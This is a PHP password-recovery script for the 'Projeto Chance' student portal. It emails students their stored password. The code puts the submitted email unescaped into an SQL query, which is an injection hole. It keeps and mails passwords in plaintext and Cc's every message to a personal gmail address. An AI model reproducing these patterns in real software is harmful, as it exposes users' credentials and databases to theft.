<?php 
/**
 * 
 */
session_start();

require "_classes/DB.class.php";
require "_classes/FuncAux.class.php";
require "_classes/Session.class.php";
require "_classes/View.class.php";

$email = isset($_POST['txt_email']) ? trim($_POST['txt_email']) : null;

/**
 * View
 */
$view = new View();
$view->mail = null;
$view->erro = null;


if ( $email ){    

    $mysqli  = DB::conectar();

    $sql  = "SELECT ";
    $sql .= "id_aluno, nome, email, senha FROM ";
    $sql .= "aluno_comple ";
    
    $sql .= "WHERE ";
    $sql .= "email = '".$email."' ";

    $sql .= "LIMIT 1";

    $aluno = $mysqli->query($sql);

    if ( $aluno->num_rows ){		

        $aluno = $aluno->fetch_object();

        # E-mail de destino
        $to       = $aluno->email;

        # Assunto
        $subject  = "Senha de acesso.";

        # Mensagem
        $message  = "<p><b>".FuncAux::getSaudacao(). " " .$aluno->nome.",</b></p>";
        $message .= "<p>Sua senha no portal do Projeto Chance: <b>".$aluno->senha."</b></p>";
        
        $message .= "<p>Este é um e-mail automático, por favor não responda.</p><br />";
        
        $message .= "<p>Cordialmente,</p>";
        
        $message .= "<p>Misael Severino da Silva<br />";
        $message .= "Presidente do Projeto Chance</p>";
    
            

        # Cabeçalhos que definem o email como sendo em formato HTML
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";

        # Headers adicionais
        $headers .= 'To: '.$aluno->nome.' <'.$aluno->email.'>' . "\r\n";
        $headers .= 'From: Projeto Chance <cursinho@projetochance.org.br>' . "\r\n";
        $headers .= 'Cc: gaah18566@gmail.com';

        $view->mail = mail($to, $subject, $message, $headers);
        
        if ( !$view->mail )
            $view->erro = "Falha no envio de e-mail, tente mais tarde.";
    }
    else{
        $view->erro = "E-mail não cadastrado!";
    }
}

# View
require_once "views/enviar-senha.php";
?>
